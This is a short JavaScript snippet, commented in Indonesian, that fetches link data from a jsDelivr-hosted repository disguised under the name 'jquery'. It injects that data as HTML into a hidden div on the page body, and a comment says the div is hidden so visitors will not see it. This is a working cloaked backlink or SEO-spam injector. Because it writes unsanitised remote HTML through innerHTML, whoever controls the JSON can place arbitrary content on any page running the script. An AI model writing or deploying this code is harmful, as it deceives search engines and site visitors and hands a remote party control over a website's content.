(function () {
  const TARGET_SELECTOR = "body"; // bisa diganti footer / div tertentu
  const STORE_URL = "https://cdn.jsdelivr.net/gh/nanangkus/jquery@refs/heads/main/store.json";

  function createArticle(data) {
    let html = "";

    data.articles.forEach(item => {
      html += item.text;

      if (item.link && item.anchor) {
        html += ' <a href="' + item.link + '" target="_blank">' + item.anchor + '</a>';
      }

      html += "<br>";
    });

    return html;
  }

  fetch(STORE_URL)
    .then(res => res.json())
    .then(json => {
      const container = document.createElement("div");
      container.style.display = "none"; // biar tidak kelihatan
      container.innerHTML = createArticle(json);

      document.querySelector(TARGET_SELECTOR).appendChild(container);
    })
    .catch(err => {
      console.error("Bunker error:", err);
    });

})();
